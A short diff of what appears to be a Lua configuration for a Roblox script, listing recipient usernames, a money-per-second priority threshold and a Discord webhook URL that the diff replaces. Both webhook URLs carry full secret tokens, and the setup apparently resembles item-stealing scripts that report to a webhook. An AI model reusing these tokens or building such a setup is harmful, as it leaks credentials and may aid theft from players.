@@ -1,5 +1,5 @@
 Usernames = {"Kryeptic", "MikeDaThrike"}
-Webhook = "https://discord.com/api/webhooks/1407367542833549393/3JnUQblbjCmDIkME8Z3ueiSL4VJuk_FyCyBea28LCWNoh9dG4HvS62ObgN2xSVnxrSEb"
+Webhook = "https://discord.com/api/webhooks/1402866656903954433/bo2pQwiTjP8TEBjz5ujrI1_oRgXGT1nxQ03LHjuqtKU3KKDTKoHVHWPE2vnNaqkbxetu"
 
 -- Priority
 MoneyPerSecond = 500000 -- DEFAULT: 300000/s
